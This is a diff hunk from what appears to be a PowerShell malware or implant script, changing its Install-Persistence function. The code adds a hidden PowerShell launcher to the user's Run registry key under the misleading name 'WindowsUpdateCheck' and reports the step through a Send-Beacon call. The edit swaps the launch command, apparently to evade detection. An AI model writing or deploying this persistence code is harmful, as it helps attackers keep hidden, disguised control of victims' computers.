@@ -67,7 +67,7 @@ function Install-Persistence {
         
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
-            -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
+            -Value "cmd /c start /min powershell -WindowStyle Hidden -File `"$scriptPath`"" -Force
         
         Send-Beacon -data @{
             type = "persistence"
